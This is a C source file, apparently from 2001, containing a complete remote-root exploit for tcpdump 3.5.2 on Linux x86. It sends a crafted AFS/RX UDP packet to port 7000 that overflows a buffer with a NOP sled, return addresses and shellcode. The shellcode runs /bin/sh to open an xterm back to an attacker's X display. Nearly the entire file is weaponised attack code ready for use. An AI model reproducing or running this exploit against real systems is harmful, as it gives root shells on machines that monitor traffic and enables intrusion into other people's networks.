   /*
    * Tcpdump remote root xploit (3.5.2) (with -s 500 or higher)
    * for Linux x86
    *
    * By: Zhodiac <zhodiac@softhome.net>
    *
    * !Hispahack Research Team
    * http://hispahack.ccc.de
    *
    * This xploit was coded only to prove it can be done :)
    *
    * As usual, this xploit is dedicated to [CrAsH]]
    * She is "the one" and "only one" :***************
    *
    * #include <standar/disclaimer.h>
    *
    * Madrid 2/1/2001
    *
    * Spain r0x
    *
    */

    #include <stdio.h>
    #include <netinet/in.h>
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <netdb.h>
    #include <arpa/inet.h>

    #define ADDR			0xbffff248
    #define OFFSET			0
    #define NUM_ADDR			10
    #define NOP				0x90
    #define NUM_NOP			100

    #define RX_CLIENT_INITIATED     1
    #define RX_PACKET_TYPE_DATA     1
    #define FS_RX_DPORT             7000
    #define FS_RX_SPORT             7001
    #define AFS_CALL                134

    struct rx_header {
        u_int32_t epoch;
        u_int32_t cid;
        u_int32_t callNumber;
        u_int32_t seq;
        u_int32_t serial;
        u_char type;
        u_char flags;
        u_char userStatus;
        u_char securityIndex;
        u_short spare;
        u_short serviceId;
    };

    char shellcode[] = /* By Zhodiac <zhodiac@softhome.net> */
      "\xeb\x57\x5e\xb3\x21\xfe\xcb\x88\x5e\x2c\x88\x5e\x23"
      "\x88\x5e\x1f\x31\xdb\x88\x5e\x07\x46\x46\x88\x5e\x08"
      "\x4e\x4e\x88\x5e\xFF\x89\x5e\xfc\x89\x76\xf0\x8d\x5e"
      "\x08\x89\x5e\xf4\x83\xc3\x03\x89\x5e\xf8\x8d\x4e\xf0"
      "\x89\xf3\x8d\x56\xfc\x31\xc0\xb0\x0e\x48\x48\x48\xcd"
      "\x80\x31\xc0\x40\x31\xdb\xcd\x80\xAA\xAA\xAA\xAA\xBB"
      "\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xDD\xDD\xDD\xDD\xe8\xa4"
      "\xff\xff\xff"
      "/bin/shZ-cZ/usr/X11R6/bin/xtermZ-utZ-displayZ";

    long resolve(char *name) {
     struct hostent *hp;
     long ip;

     if ((ip=inet_addr(name))==-1) {
       if ((hp=gethostbyname(name))==NULL) {
            fprintf (stderr,"Can't resolve host name [%s].\n",name);
            exit(-1);
          }
        memcpy(&ip,(hp->h_addr),4);
        }
     return(ip);
    }


    int main (int argc, char *argv[]) {

     struct sockaddr_in addr,sin;
     int sock,aux, offset=OFFSET;
     char buffer[4048], *chptr;
     struct rx_header *rxh;
     long int *lptr, return_addr=ADDR;


      fprintf(stderr,"\n!Hispahack Research Team (http://hispahack.ccc.de)\n");
      fprintf(stderr,"Tcpdump 3.5.2 xploit by Zhodiac <zhodiac@softhome.net>\n\n");


      if (argc<3) {
        printf("Usage: %s <host> <display> [offset]\n",argv[0]);
        exit(-1);
        }

      if (argc==4) offset=atoi(argv[3]);
      return_addr+=offset;

      fprintf(stderr,"Using return addr: %#x\n",return_addr);

      addr.sin_family=AF_INET;
      addr.sin_addr.s_addr=resolve(argv[1]);
      addr.sin_port=htons(FS_RX_DPORT);

      if ((sock=socket(AF_INET, SOCK_DGRAM,0))<0) {
         perror("socket()");
         exit(-1);
         }

      sin.sin_family=AF_INET;
      sin.sin_addr.s_addr=INADDR_ANY;
      sin.sin_port=htons(FS_RX_SPORT);

      if (bind(sock,(struct sockaddr*)&sin,sizeof(sin))<0) {
          perror("bind()");
          exit(-1);
          }

      memset(buffer,0,sizeof(buffer));
      rxh=(struct rx_header *)buffer;

      rxh->type=RX_PACKET_TYPE_DATA;
      rxh->seq=htonl(1);
      rxh->flags=RX_CLIENT_INITIATED;

      lptr=(long int *)(buffer+sizeof(struct rx_header));
      *(lptr++)=htonl(AFS_CALL);
      *(lptr++)=htonl(1);
      *(lptr++)=htonl(2);
      *(lptr++)=htonl(3);

      *(lptr++)=htonl(420);
      chptr=(char *)lptr;
      sprintf(chptr,"1 0\n");
      chptr+=4;

      memset(chptr,'A',120);
      chptr+=120;
      lptr=(long int *)chptr;
      for (aux=0;aux<NUM_ADDR;aux++) *(lptr++)=return_addr;
      chptr=(char *)lptr;
      memset(chptr,NOP,NUM_NOP);
      chptr+=NUM_NOP;
      shellcode[30]=(char)(46+strlen(argv[2]));
      memcpy(chptr,shellcode,strlen(shellcode));
      chptr+=strlen(shellcode);
      memcpy(chptr,argv[2],strlen(argv[2]));
      chptr+=strlen(argv[2]);

      sprintf(chptr," 1\n");

      if (sendto(sock,buffer,520,0,&addr,sizeof(addr))==-1) {
         perror("send()");
         exit(-1);
         }

      fprintf(stderr,"Packet with Overflow sent, now wait for the xterm!!!! :)\n\n");

      close(sock);
      return(0);
     }

   ------- tcpdump-xploit.c ----------
